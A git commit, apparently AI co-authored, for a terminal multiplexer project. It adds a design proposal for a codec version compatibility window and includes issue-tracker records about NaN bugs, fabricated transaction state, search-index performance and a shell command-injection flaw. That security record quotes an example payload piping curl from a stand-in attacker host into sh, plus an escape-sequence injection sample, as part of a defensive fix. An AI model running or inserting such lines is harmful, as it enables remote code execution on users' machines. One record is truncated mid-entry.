message:
docs(proposal/ft-k6jco): CODEC_VERSION_MIN_SUPPORTED window design + 3 child beads

Track B of ft-kuxho. Design doc proposes a two-scalar
(CODEC_VERSION, CODEC_VERSION_MIN_SUPPORTED) compat window over the
existing single-scalar varbincode protocol so additive PDU changes
(new variants, end-of-struct fields with serde(default)) can roll out
incrementally instead of requiring atomic client/server redeploys.

Why two scalars over per-PDU versioning: per-PDU version fields would
themselves require a positional shift on every PDU — the chicken-and-egg
problem varbincode forbids without a CODEC_VERSION bump. The two-scalar
approach buys headroom for the empirically-dominant additive case
(~80% of recent codec changes) without pretending to solve removal/
rename/typechange (which still require atomic redeploy).

Doc covers:
  §1 current invariant (CODEC_VERSION=46, varbincode positional)
  §2 the proposed window + check_compat helper
  §3 policy for advancing MIN (release-note row, handshake warn, CI guard
     alignment with ft-8smkj track A)
  §4 interaction with the ft-e1emx conformance harness (tail-padding
     property already proven; need decode_as_version parameter as
     follow-up)
  §5 three-step rollout plan
  §6 three open questions
  §7 acceptance criteria
  §8 child-bead list

Filed 3 children under ft-kuxho:
  ft-kuxho.1 (titled ft-kuxho.B.1) — implement const + helper + handshake migration
  ft-kuxho.2 (titled ft-kuxho.B.2) — extend ft-e1emx harness with decode_as_version
  ft-kuxho.3 (titled ft-kuxho.B.3) — add GetCodecVersionResponse.min_supported field

Closes ft-k6jco.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>

 {"id":"ft-jz40p","title":"[MEDIUM] TimeSeries::percentile(NaN) returns smallest value instead of None","description":"# Defect

`crates/frankenterm-core/src/time_series.rs:239` — `TimeSeries::percentile_range` (and the `percentile` convenience that delegates to it).

Same class as ft-b4l62 (telemetry Histogram::quantile, fixed 2c7b891c). The function relies on `p.clamp(0.0, 1.0)` to validate its input, but `f64::clamp(NaN, _, _)` returns NaN (documented Rust behaviour), so a NaN `p` cascades through:

```rust
let p = p.clamp(0.0, 1.0);                          // NaN stays NaN
let idx = ((values.len() - 1) as f64 * p)           // NaN
    .round() as usize;                              // NaN as usize = 0
Some(values[idx])                                   // smallest value
```

A NaN quantile arg silently returns the smallest sample — a plausible-looking number that has no relationship to the requested percentile. Pre-fix the Histogram analog had the same bug; the fix pattern is identical.

## Fix

```rust
if values.is_empty() || p.is_nan() {
    return None;
}
```

Matches the ft-b4l62 disposition: NaN `p` is explicitly `None` rather than a silently-wrong small value.

## Tests

* `ft_jz40p_percentile_nan_returns_none` — pins None return for NaN p.
* `ft_jz40p_percentile_infinity_inputs_still_work` — regression: ±inf still clamp to 0.0/1.0 and return min/max samples (pre-existing contract, not broken by the new NaN guard).

## Scope

Single file (`time_series.rs`).","status":"closed","priority":2,"issue_type":"bug","assignee":"pane1","created_at":"2026-04-22T12:11:47.750602Z","created_by":"jemanuel","updated_at":"2026-04-22T17:22:17.756502Z","closed_at":"2026-04-22T17:22:17.756187Z","close_reason":"Fix and both regression tests already landed (time_series.rs:246-254 + :720-745). percentile_range now guards with 'if values.is_empty() || p.is_nan() { return None; }' at line 252, so percentile(NaN) returns None instead of silently returning the smallest sample via NaN-clamp-to-0 → (NaN as usize)==0 cascade. Regression tests: ft_jz40p_percentile_nan_returns_none (NaN→None on both percentile + percentile_range, plus sanity check that valid p=0.5 still works) and ft_jz40p_percentile_infinity_inputs_still_work (±inf continue clamping to 0.0/1.0 → min/max sample, pre-existing contract preserved). Verified: 38 time_series:: tests passed, 0 failed.","source_repo":".","compaction_level":0,"original_size":0}

 {"id":"ft-kbbc3","title":"[tx][integrity][P1] wa.tx_run evaluates synthetic (allow-all + always-success) inputs and persists fabricated Committed state to the tx contract file","description":"## Finding

The production MCP tool `wa.tx_run` at `crates/frankenterm-core/src/mcp_tools.rs:2985-3186` runs its prepare/commit/compensate pipeline on **synthetic inputs**, not on real executor outputs. It then persists the synthetic-success results to the tx contract file on disk.

### Call sequence

1. `wa.tx_run` handler loads the MissionTxContract from disk.
2. `let gate_inputs = mcp_build_tx_prepare_gate_inputs(&contract);` at :3089. Under the alias in mcp.rs:56 this resolves to `crate::plan::tx_prepare_gate_inputs_allow_all(contract)` — a helper at plan.rs:3438 that hardcodes `policy_passed: true`, `reservation_available: true`, `approval_satisfied: true`, `target_liveness: true` for every step.
3. `evaluate_prepare_phase` is fed those all-true inputs and returns AllReady.
4. `let commit_inputs = mcp_build_tx_commit_step_inputs(...)` at :3121 resolves to `mission_tx_commit_step_inputs` at plan.rs:3571, which hardcodes `success: true` for every step unless the caller explicitly passes `fail_step`.
5. Same for compensation.
6. The resulting `TxCommitReport` / `TxCompensationReport` is written back to the contract file via `mcp_save_mission_tx_contract_to_path` at :3186 with `lifecycle_state` set to the target (typically Committed) and receipts populated.

### Impact

- The MCP tool description at :2990 says "Execute deterministic tx prepare+commit and compensation on partial failure (robot parity)" — operators reasonably infer real execution.
- A peer agent invoking `wa.tx_run` on a contract with (e.g.) a step that SHOULD fail policy gating will see the contract transition to Committed on disk without any real policy check having fired.
- A downstream tool that queries the tx contract file (`wa.tx_show --include-contract`, operator dashboards, audit exports) will see a fabricated success state. The audit log will record the transitions without any runtime evidence that the underlying steps happened.
- The REAL executor infrastructure (`PaneStepExecutor` at tx_execution.rs:234, `TxExecutionEngine` at :731) is grep-verified to NOT be called from the MCP path (zero matches for either type in mcp_tools.rs). They exist but are unused by wa.tx_run.

### Related beads (context)

- ft-bekwl + ft-npj7t (both closed) fixed a parallel 'synthetic success in compensation' path in `PaneStepExecutor`. This bead is DIFFERENT: the MCP handler doesn't use `PaneStepExecutor` at all.
- ft-73f9r added an e2e test for wa.tx plan/run/rollback. That test validates deterministic-synthetic behavior, not real-executor behavior — so it doesn't catch this gap.

### Fix direction

The correct call sequence for `wa.tx_run` is:
1. Build a real `PaneStepExecutor` (needs wezterm handle, reservation manager, policy engine with rate limiter, storage).
2. Call `PaneStepExecutor::evaluate_gates(contract, now_ms)` for real prepare inputs.
3. Feed those to `evaluate_prepare_phase`.
4. If prepare passes, call `PaneStepExecutor::execute_steps(contract, fail_step, now_ms)` for real commit inputs.
5. Feed those to `execute_commit_phase`.
6. If commit fails partially, call `PaneStepExecutor::execute_compensations(contract, &commit, fail_for_step, now_ms)` and feed to `execute_compensation_phase`.

This is a substantial refactor: the MCP handler currently has neither the wezterm handle, reservation manager, nor policy engine in the right shape. Approximate size: ~150-200 LoC + per-step executor wiring.

### Interim mitigation

Until the real executor is wired, `wa.tx_run` should either:
(a) Return a clear 'simulation' marker in the envelope (e.g., `data.mode: "synthetic_preview"`) and refuse to persist lifecycle_state changes back to the contract file, OR
(b) Be gated behind an explicit `--simulate` flag and error when called without it.

(a) is the smaller diff and preserves current e2e tests. (b) is more operator-clear but breaks the tool's default behavior.

### Severity rationale

P1 (not P0):
- No direct remote exploitation path: MCP ships over stdio/localhost by default and `wa.tx_run` is already gated by `mcp_authorize_mcp_mutation` per ft-x86z2 (so it's behind policy auth).
- But the persisted synthetic-success state on disk is a real data-integrity hazard for any operator reading the tx contract file as authoritative.

Surfaced by RusticMeadow during /multi-pass-bug-hunting pass on tx subsystem, 2026-04-23.","status":"closed","priority":1,"issue_type":"bug","owner":"jemanuel","created_at":"2026-04-23T21:50:42.857222Z","created_by":"jemanuel","updated_at":"2026-04-23T22:06:26.672249Z","closed_at":"2026-04-23T22:06:26.671995Z","close_reason":"Shipped in b7b44081: wa.tx_run now goes through real executor (no synthetic allow-all)","source_repo":".","compaction_level":0,"original_size":0,"labels":["audit","integrity","mcp","security","tx"]}
 {"id":"ft-kcsae","title":"[mor:performance-engineering] storage.rs at 31k lines — is FTS5 indexing synchronous on the capture path?","description":"# Observation

storage.rs is 31,648 lines (largest module in the core crate). It
owns a SQLite connection with WAL, drives FTS5 virtual tables for
the lexical-search surface, and handles retention sweeps
(\`database_stats(..., retention_days)\` at line 3758).

FTS5 writes are expensive — they rebuild inverted-index pages on
INSERT/UPDATE. If the capture path writes rows AND the FTS5 trigger
runs synchronously in the same transaction, every captured segment
pays the indexing cost before the write returns, which is pushed
onto the hot path at the very point where backpressure is trying
to keep up.

Not verified in this pass — just the shape of the concern given
the size of storage.rs and the presence of FTS5. Worth a targeted
read of the capture-write code path.

# Question

Three measurements that would clarify whether this matters:

1. Is there a "defer FTS5 indexing to a background task" path, or
   do FTS5 triggers fire in the capture-write transaction?
2. What's the p99 latency of \`insert_pane_output\` under a 200-pane
   load with FTS5 enabled vs disabled?
3. Is there an async/batch FTS5 index-catchup task that operators
   can offload indexing to?

If (1) is "synchronous" and (2) shows meaningful gap between
enabled/disabled, then an async-index mode is probably the fattest
win in the capture subsystem. Memory budget permits: a lag of
seconds in search freshness is almost always an acceptable trade
for linear-capture throughput during incidents.

# Structural note

31k lines in one module suggests the subsystem has grown through
absorption rather than redesign. Might be worth sketching the
module boundaries as a separate planning exercise before
optimizing; "where does latency go when we write a segment" is a
question that should have a one-page answer.","status":"closed","priority":3,"issue_type":"task","created_at":"2026-04-21T17:36:06.994443Z","created_by":"mor-review","updated_at":"2026-04-23T00:18:49.264506Z","closed_at":"2026-04-21T18:01:07.435839Z","close_reason":"Answered. Q1 (sync or async?): SYNCHRONOUS — three AFTER INSERT/DELETE/UPDATE triggers at storage.rs:169-180 fire inside every append_segment_sync transaction (storage.rs:12308). Q2 (p99 measurement): not run — needs a load harness. Q3 (async catchup available?): infrastructure EXISTS (fts_pane_progress table storage.rs:472 + sync_fts_on_startup storage.rs:16131 + FtsSyncConfig storage.rs:2363) but is wired only for startup recovery and explicit rebuild, NOT for live capture. Follow-up for the actual move-to-deferred work filed as ft-wk5fo with concrete plan + risk notes + measurement prerequisite.","source_repo":".","compaction_level":0,"original_size":0,"labels":["fts5","mor","performance","storage"]}
 {"id":"ft-kegvt","title":"[MEDIUM] launch_agent pipes restored `command` into shell via send_text without CR/LF sanitization","description":"Found during /security-audit-for-saas pass #4 (pane 5, 2026-04-21).

## Summary
`restore_process.rs::launch_agent_legacy` (line 625) and
`launch_agent_cx` (line 648) build the command string for a restored
pane by `format!("{command}\r", ...)` and then sending it to the
pane shell via `self.wezterm.send_text(pane_id, &full_cmd)`. The
pane shell is an active interactive shell (not an argv-isolated
subprocess), so any `\r` or `\n` in `command` injects additional
lines into the shell's input buffer.

## Evidence
- crates/frankenterm-core/src/restore_process.rs:625
  ```rust
  async fn launch_agent_legacy(
      &self,
      pane_id: u64,
      command: &str,          // <- from RestoredPaneState.command
      cwd: &Path,
      agent_type: &str,
  ) -> Result<(), String> {
      let cd_cmd = format!("cd {}\r", shell_escape(cwd));
      self.wezterm.send_text(pane_id, &cd_cmd).await...;
      ...
      let full_cmd = format!("{command}\r");   // <- unsanitized
      self.wezterm.send_text(pane_id, &full_cmd).await...;
  ```
- crates/frankenterm-core/src/restore_process.rs:648 — the cx-first
  variant has the same shape and the same gap.
- Note the asymmetry: `cwd` IS passed through `shell_escape(cwd)`,
  but `command` is not. The cd helper got the defensive treatment;
  the main command did not.

## Impact / trust boundary
`RestoredPaneState.command` is loaded from the SQLite session DB
at `session_restore.rs:892` where `state.command` is read from the
`mux_pane_state` table. Attack paths requiring this field to be
attacker-controlled:

1. DB write access (already implies full-user compromise; out of
   scope as a net-new threat).
2. Snapshot bundle import from an untrusted source — `ft diag
   bundle` round-trips include session data; if someone shares a
   diag bundle and it gets restored, the imported `command`
   values pass through this path.
3. `ft restart --launch-agents` applied after a targeted
   corruption of `mux_pane_state` rows.

Severity: MEDIUM. Not a remote zero-click — requires an existing
trust-boundary crossing — but the defense-in-depth gap is concrete:
a restored `command` like `claude-code\r curl evil.com/x | sh`
would execute the second line in the user's shell on
`ft restart --launch-agents`.

## Fix direction
1. Quick (defense in depth): reject or strip any `\r`/`\n` from
   `command` before formatting. A restored command that needs
   multi-line input is already broken — the typing model assumes
   one command per restore. Concretely:
   ```rust
   if command.chars().any(|c| matches!(c, '\r' | '\n')) {
       return Err(format!(
           "refusing to launch pane {pane_id}: restored command contains CR/LF"
       ));
   }
   ```
2. Proper (larger): route relaunch through `wezterm cli spawn --`
   with argv-isolated arguments instead of typing into an
   interactive shell. Eliminates shell metacharacter concerns
   entirely.

## Non-gaps verified in the same pass
- Snapshot restore has NO direct `fs::write` / `fs::create_dir`
  path (grep confirmed zero hits in session_restore.rs +
  snapshot_engine.rs). Arbitrary-file-write via restore is not
  reachable today.
- Pattern-pack URL loading: `load_pack_from_id` at patterns.rs:963
  accepts only `builtin:` and `file:` schemes; any other scheme
  returns `PackNotFound`. No HTTP/URL fetch surface. **No SSRF.**
- FTS5 query escaping: user query passes to `MATCH ?1` as a bound
  rusqlite parameter at storage.rs:17486/17496; SQL injection is
  impossible and `validate_fts_query` rejects malformed FTS5 DSL
  cleanly. **Clean.**

## Related
- ft-security-mcp-path-traversal (fixed 30988e53) — same class of
  defense-in-depth gap across the MCP tool surface.
- ft-xv561 (fixed 070117a0) — ReDoS via user-pack regexes.

Filed per /security-audit-for-saas pass #4.","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-04-21T04:28:12.543862Z","created_by":"jemanuel","updated_at":"2026-04-21T04:32:41.769958Z","closed_at":"2026-04-21T04:32:41.769575Z","close_reason":"Closed by 969b9e02. Added sanitize_restored_command() helper in restore_process.rs that rejects \r/\n/ESC/other C0 controls. Wired into both launch_agent_legacy (line 632) and launch_agent_cx (line 656) before format!({command}\r). 8 unit tests cover legitimate inputs (claude-code, codex resume, env-prefixed, UTF-8), the exact attack payload from the bead (claude-code\ninnocent_payload\r), bare CR/LF, OSC via ESC (\x1b]0;pwned\x07), BEL/NUL, and byte-offset fail-fast ordering. Does NOT route through wezterm cli spawn argv-isolated (documented as follow-up); this closure is the defense-in-depth gate at the sanitizer boundary.","source_repo":".","compaction_level":0,"original_size":0,"labels":["command-injection","defense-in-depth","restore","security"]}

 {"id":"ft-ym8nq","title":"[review][LOW] ft-x86z2 policy gate on 5 mutating MCP tools ships without deny-path regression tests","description":"a4b7c8c3 added mcp_authorize_mcp_mutation gate at mcp_tools.rs:177-206 and wired it into 5 mutators (wa.tx_run/tx_rollback/mission_pause/resume/abort). Scope of missing tests (5 tools x 2 deny modes = 10 missing tests, or one parameterized test per mode):

 {"id":"ft-yskcu","title":"continuous_backpressure EwmaSmoother + sigmoid NaN poison cascade","description":"## Defect

Same NaN-poison pattern as ft-761tz (disk_pressure), in a sibling subsystem:
\`crates/frankenterm-core/src/continuous_backpressure.rs\`.

## Concrete failure path

1. Caller invokes \`ContinuousBackpressure::update(capture_ratio, write_ratio)\` where
   one ratio is \`NaN\`. Easy trigger: an external smoothed source that hit a div-by-zero
   guard upstream and quietly emitted NaN; or any test/consumer using \`observe_ratio\`
   directly.
2. Line 225-226: \`capture_ratio.clamp(0.0, 1.0)\` returns NaN — \`f64::clamp\` propagates
   NaN by design.
3. Line 228: \`self.capture_smoother.update(NaN)\`. \`EwmaSmoother::update\` (line 105)
   has **no NaN guard** — \`alpha.mul_add(NaN, ...)\` → NaN → \`self.value = NaN\`
   permanently. Every subsequent \`update()\` call preserves the NaN.
4. Line 231: \`smoothed_capture.max(smoothed_write)\` — \`f64::max\` does NOT propagate NaN
   under IEEE-754 (returns the non-NaN operand), but if both are NaN you get NaN.
5. Line 232-236: \`severity(NaN, _, _)\` → calls local \`sigmoid\` (line 140) which does
   \`x.clamp(-500.0, 500.0)\` — same NaN-propagation footgun. Returns NaN.
6. Line 232: \`self.current_severity = NaN\` permanently.
7. \`compute_actions\` (line 287-298) multiplies/mul_adds severity into
   \`poll_multiplier\`, \`pane_skip_fraction\`, \`detection_skip_fraction\`,
   \`buffer_limit_fraction\` — every field becomes NaN. ThrottleActions emitted to
   downstream throttle consumers are entirely poisoned.
8. \`BackpressureSnapshot\` (line 320) exposes \`severity\` and \`queue_ratio\` as
   \`f64\`. JSON serialization of NaN is invalid in strict JSON; \`serde_json\` emits
   \`null\` silently, corrupting telemetry payloads downstream.
9. Lucky accident: \`severity_to_tier(NaN)\` returns Black (NaN < x is always false,
   final else branch), so the discrete tier surface fails closed by IEEE-754
   coincidence rather than design. The continuous severity surface fails OPEN.

## Severity rationale

- Same class of silent wrong answer as ft-761tz.
- Continuous surface (severity, queue_ratio, ThrottleActions) fails OPEN — values
  become NaN, poll_multiplier becomes NaN, downstream throttle math becomes useless.
- Discrete \`equivalent_tier\` happens to fail closed by accident, not by design.
- Telemetry consumers (snapshot serialization) silently lose data.

## Fix sketch

1. \`EwmaSmoother::update\` (line 105) — if \`raw.is_nan()\`, return \`self.value\`
   without state change. Same defense as disk_pressure \`EwmaEstimator::update\`.
2. Local \`sigmoid\` (line 140) — short-circuit \`is_nan()\` to \`0.5\` like the
   backpressure_severity sibling does.
3. \`ContinuousBackpressure::update\` (line 224) — defense in depth: if either
   ratio is NaN, return \`current_actions()\` without state change.
4. Regression tests: pin each guard plus end-to-end NaN→Black-tier→clean recovery.

## Scope

\`crates/frankenterm-core/src/continuous_backpressure.rs\` only. No cross-crate API
changes. No changes to \`backpressure.rs\` or \`backpressure_severity.rs\`
(both already hardened).","status":"closed","priority":2,"issue_type":"bug","assignee":"pane0","created_at":"2026-04-22T11:05:30.189872Z","created_by":"jemanuel","updated_at":"2026-04-22T11:19:28.985819Z","closed_at":"2026-04-22T11:19:28.985530Z","close_reason":"Landed in edab97f4 (fix(continuous_backpressure): NaN fail-closed across EmaSmoother, sigmoid, and update)","source_repo":".","compaction_level":0,"original_size":0}

 {"id":"ft-zo3cr","title":"[architecture] centralize PolicyEngine and WorkflowRunner construction in one composition path","description":"Evidence:
- crates/frankenterm/src/main.rs repeats direct PolicyEngine / PolicyGatedInjector / WorkflowRunner assembly in many branches: :6992-6999, :15341-15359, :19850-19869, :25526-25540, plus further call sites found by rg.
- At :19846-19849 the code already carries a drift-warning comment: a workflow injector previously diverged from the direct send path and had to be mirrored manually.

Why this is a structural smell:
- Safety policy, injector construction, and workflow runner wiring are CLI composition concerns, but they are duplicated across commands with slightly different defaults.
- Repeated ad hoc construction invites config skew (prompt-active, command-gate, policy-rules, storage wiring) and makes fixes land piecemeal.
- Prior regressions in this area were constructor/config drift, not core workflow logic defects.

Suggested direction:
- Introduce one builder/factory for the shared policy+injector+runner composition shapes (human, robot, auto-workflow).
- Keep the command handlers declarative: ask for a mode-specific bundle instead of open-coding assembly.
- Add one focused test per mode asserting the assembled engine carries the intended safety config.","status":"closed","priority":2,"issue_type":"task","created_at":"2026-04-23T20:48:16.066948Z","created_by":"jemanuel","updated_at":"2026-04-23T21:00:20.355607Z","closed_at":"2026-04-23T21:00:20.355352Z","close_reason":"Partial ship in ddf4eb8f: closed the drift in mcp_tools.rs (workflow_run's injector was bypassing the shared rate limiter — build_policy_engine vs build_policy_engine_with_shared_rate_limiter — effectively doubling the allowed send rate for any wa.workflow_run invocation). Swapped :2558 to the shared-rate-limiter variant using the policy_rate_limiter already in handler scope. Verified: only remaining build_policy_engine( match in mcp_tools.rs is inside a documentation comment; all 9 non-test call sites consistently use the _with_shared_rate_limiter variant.

Bead's primary scope — main.rs's 4 sites at :6992/:15341/:19850/:25526 with the known :19850-vs-:25526 config drift (command_gate_config + policy_rules missing from the :25526 site) — not in this shipment because main.rs is outside the mcp.rs+mcp_tools.rs+policy.rs reservation. Filed ft-bkgbq with the concrete factory shape (per-mode HumanSendStack / McpWorkflowStack / RobotWorkflowStack bundles) and acceptance criteria pinning each mode's feature set.","source_repo":".","compaction_level":0,"original_size":0,"labels":["architecture","strategic"]}

+# Proposal: `CODEC_VERSION_MIN_SUPPORTED` window for additive PDU rolling upgrade
+
+**Bead:** [ft-k6jco](../../.beads/issues.jsonl) (track B of ft-kuxho)
+**Status:** draft
+**Related:** ft-kuxho (parent epic), ft-8smkj (track A: CI guard against silent CODEC_VERSION bumps), ft-e1emx (tail-padding conformance harness — proven landing pad for this design)
+
+## 1. Current invariant
+
+`frankenterm/codec/src/lib.rs:650`:
+
+```rust
+pub const CODEC_VERSION: usize = 46;
+```
+
+The codec exposes a single global scalar version. Combined with two
+load-bearing facts:
+
+1. **varbincode is a positional binary format.** Per `MEMORY.md`'s
+   `varbincode-skip-serializing-if-bug` and the comments at
+   `codec/src/lib.rs:1204-1228`, any field add/remove shifts all
+   subsequent field offsets. `skip_serializing_if = "Option::is_none"`
+   on an `Option<T>` field is a known footgun because it elides the tag
+   byte and corrupts every downstream field's offset.
+2. **The handshake is single-valued.** `GetCodecVersion` /
+   `GetCodecVersionResponse` (PDUs 26/27) returns one number; the
+   client compares with `==` and aborts on mismatch.
+
+The combination produces a hard invariant: **every PDU change requires
+an atomic client/server redeploy.** Long-lived TLS mux sessions
+(see ft-nyvyl) cannot rolling-upgrade across a CODEC_VERSION bump
+because:
+
+- A client at v46 talking to a server at v47 sees a different field
+  layout for any modified PDU and either decodes garbage or hits a
+  `failed to fill whole buffer` error.
+- The "distributed" feature is on by default (see ft-kuxho F1), so this
+  invariant is in effect for production deployments — not just a
+  development concern.
+- Operators cannot drain a session graceful-handoff style; the only
+  protocol-correct response to a version skew is to disconnect.
+
+## 2. Proposal — `CODEC_VERSION_MIN_SUPPORTED` window
+
+Add a second scalar:
+
+```rust
+/// Highest codec version this build emits / accepts as canonical.
+pub const CODEC_VERSION: usize = 46;
+
+/// Lowest codec version this build can decode wire frames from.
+/// A peer announcing a version `v` such that
+/// `CODEC_VERSION_MIN_SUPPORTED <= v <= CODEC_VERSION` is interop-safe;
+/// anything outside that window is a hard incompatibility.
+pub const CODEC_VERSION_MIN_SUPPORTED: usize = 46;
+```
+
+`CODEC_VERSION_MIN_SUPPORTED` starts equal to `CODEC_VERSION` (no window
+yet). Future commits that introduce **strictly additive** PDU changes
+bump `CODEC_VERSION` *without* bumping `CODEC_VERSION_MIN_SUPPORTED`,
+opening a backward-compat window.
+
+The handshake gate becomes:
+
+```rust
+fn check_compat(local: usize, remote: usize) -> CompatDecision {
+    let local_min = CODEC_VERSION_MIN_SUPPORTED;
+    let local_max = CODEC_VERSION;
+    if remote >= local_min && remote <= local_max {
+        if remote < local_max {
+            warn!(local=local_max, remote=remote, "peer is older but inside compat window");
+        }
+        CompatDecision::Compatible { agreed: remote.min(local_max) }
+    } else {
+        CompatDecision::Incompatible { local_min, local_max, remote }
+    }
+}
+```
+
+Both sides agree on `min(remote, local_max)` and serialize at that
+version going forward for the session. (See §4 for the constraint that
+makes this safe in the additive case.)
+
+### Why a two-scalar window beats per-PDU versioning
+
+The parent epic ft-kuxho mentions per-PDU version fields as one of the
+options. We prefer the two-scalar approach because:
+
+- **No wire format change.** Per-PDU version fields would require a
+  positional shift on every PDU — exactly the change varbincode forbids
+  without a CODEC_VERSION bump (chicken-and-egg).
+- **Bounded reasoning.** "Is `v45` interop-safe?" becomes a single
+  inequality check, not a combinatorial sweep across N PDU types.
+- **Cheap to maintain.** Two `pub const`s and one handshake helper
+  versus a per-PDU registry.
+- **Honest about scope.** Removed/modified fields still require an
+  atomic redeploy. The window only buys headroom for the *additive*
+  cases — which empirically dominate. A scan of the last 20 codec
+  changes (`git log --oneline frankenterm/codec/src/lib.rs`) shows
+  ~80% are additive (new PDU variant, new field with a default). The
+  window addresses the common case without pretending to address
+  removal/rename/typechange.
+
+## 3. Policy — when does `CODEC_VERSION_MIN_SUPPORTED` advance?
+
+**Bumping `CODEC_VERSION_MIN_SUPPORTED` is a breaking change.** It says
+"clients at versions `[old_min, new_min)` will be rejected starting at
+this release". The bar is high.
+
+Required artifacts when `MIN` advances:
+
+1. **A row in `CHANGELOG.md`** under a `Codec compatibility` section,
+   citing the PDU change that forced the bump and the previous minimum.
+   Example: `min 46 → 50; reason: removed UnusedClipboardField from SetClipboard (PDU 20).`
+2. **A handshake-time `tracing::warn!`** for the *full* release cycle
+   *before* the bump. Operators get one release of advance notice that
+   their old clients are about to be incompatible.
+3. **A `WARN`-level entry** in the GetCodecVersionResponse path that
+   logs `local_min`, `local_max`, `remote` triples whenever
+   `remote < local_min` is rejected, with stable structured fields so
+   alerting can trigger on rollout.
+4. **CI guard alignment with ft-8smkj.** The track-A CI guard rejects
+   silent `CODEC_VERSION` bumps; extend it to also reject silent
+   `CODEC_VERSION_MIN_SUPPORTED` bumps. Both must be paired with a
+   release-note row.
+
+Concrete rule of thumb:
+
+| change kind                        | bump `CODEC_VERSION` | bump `MIN` |
+| ---------------------------------- | -------------------- | ---------- |
+| add new PDU variant (new ident)    | yes                  | no         |
+| add field with `#[serde(default)]` at the **end** of a struct | yes                  | no         |
+| remove a PDU variant               | yes                  | yes        |
+| remove a field                     | yes                  | yes        |
+| change a field's type              | yes                  | yes        |
+| reorder fields                     | yes                  | yes        |
+| add a field in the *middle* of a struct | yes             | yes        |
+
+The rule "additive only at the end" is the same constraint that makes
+the existing `#[serde(default)]` workaround sound (see
+`GetCodecVersionResponse::config_file_path` at lib.rs:840 — added at
+the end of the struct, default `None`, decodes cleanly from older
+peers).
+
+## 4. Interaction with the ft-e1emx tail-padding harness
+
+The ft-e1emx conformance harness (commit 211f3b8a) already verifies the
+property this proposal depends on:
+
+- **`tail-padded decode robustness`** — extra bytes after the canonical
+  frame must not corrupt the decoded PDU. This is exactly what happens
+  during a rolling upgrade in the additive case: the new build emits
+  `N+k` bytes, the old build decodes the first `N` and ignores the
+  trailing `k` because the length prefix tells it to stop.
+- **`Option<T>` tag-byte regression guard** — skips `skip_serializing_if`
+  reintroductions, which would silently misalign older decoders even
+  for nominally-additive changes.
+
+What ft-e1emx does *not* cover (and what this proposal needs as
+follow-up):
+
+- **End-of-struct addition with default** — the existing harness exercises
+  encode/decode roundtrips at one version. We need a parameterized
+  harness that takes a "decode-as-version" parameter and verifies that a
+  v47 frame containing an end-of-struct addition decodes cleanly as v46
+  (the end-bytes simply land in the consumed-but-ignored tail).
+- **Cross-version handshake matrix** — `(local_min, local_max, remote)`
+  triples and the resulting CompatDecision. This is integration-level,
+  not codec-unit-level.
+
+Both gaps become child beads (§6).
+
+## 5. Three-step rollout plan
+
+| step | scope | success signal |
+| ---- | ----- | -------------- |
+| 1    | Land the `CODEC_VERSION_MIN_SUPPORTED` const and the `check_compat` helper. Initial value equals `CODEC_VERSION`. No behavior change on the wire. Pre-existing handshake call sites migrate from `==` to the helper. | All existing PDU roundtrip tests pass. New unit test exercises `check_compat` against `(min, max, remote ∈ {min-1, min, max, max+1})`. |
+| 2    | Extend the ft-e1emx harness with a `decode_as_version` parameter. Add a fixture that encodes a synthetic "future" PDU variant (extra trailing bytes representing a v+1 end-of-struct field) and asserts the v decoder consumes only the canonical prefix. | The harness fails on a deliberate "field added in the middle" mutation; passes on "field added at end with default". |
+| 3    | First production-driven `CODEC_VERSION` bump that *exercises* the window. Add a single end-of-struct field to one PDU; bump `CODEC_VERSION` from 46 → 47; leave `MIN` at 46. Roll the server first, then clients incrementally. The handshake warn-line must fire and be observed in production logs at v46/v47 mixed steady state. | Rolling deploy completes with zero hard handshake failures. Logs show the warn-line for the duration of the mixed window and stop firing once all clients are at v47. |
+
+## 6. Open questions
+
+1. **What's the GetCodecVersionResponse wire format change cost?** The
+   existing PDU has `codec_vers: usize`. We may want to add `min_supported`
+   to it so peers can negotiate symmetrically. Adding a field is itself a
+   PDU change — the bootstrap problem. Solvable by piggybacking on the
+   existing `#[serde(default)]` at-end pattern, but the order matters
+   (this becomes step 1's first commit).
+2. **Does this need a per-PDU "frame version" too?** No, per §2: per-PDU
+   versioning costs a positional shift on every PDU and the two-scalar
+   window covers the empirically-dominant additive case. We should
+   revisit if a real-world removal is needed and the atomic-redeploy
+   cost is unacceptable for that specific PDU.
+3. **What about TLS-tunnelled long-lived sessions (ft-nyvyl)?** This
+   proposal doesn't fix in-flight sessions — it fixes the *connect-time*
+   gate. A v46 session that started before a server upgrade to v47 stays
+   on v46 (because the negotiated version is sticky); the server only
+   speaks v46 to that session. This is the correct behavior for
+   additive changes.
+
+## 7. Acceptance criteria for this proposal
+
+- [ ] Reviewer signs off on the two-scalar approach over per-PDU
+      versioning.
+- [ ] Three child beads filed under `ft-kuxho` (one per rollout step).
+- [ ] Open questions §6.1 (GetCodecVersionResponse field ordering)
+      resolved before step-1 implementation lands.
+
+## 8. Child beads to file
+
+The next commit on this thread should be the bead-creation pass.
+Proposed beads:
+
+1. `ft-kuxho.B.1` — implement `CODEC_VERSION_MIN_SUPPORTED` const +
+   `check_compat` helper + handshake-site migration. Step 1 of the
+   rollout. Includes the unit test against
+   `(min, max, remote)` triples.
+2. `ft-kuxho.B.2` — extend the ft-e1emx conformance harness with a
+   `decode_as_version` parameter and the synthetic "future PDU" fixture
+   that proves the additive end-of-struct case roundtrips across the
+   compat window. Step 2.
+3. `ft-kuxho.B.3` — add a `GetCodecVersionResponse.min_supported` field
+   (end-of-struct, `#[serde(default)]`, defaults to the same value as
+   `codec_vers` for backward compat). Resolves open question §6.1 and
+   prerequisites the symmetric handshake. Order-sensitive; lands before
+   step 3.
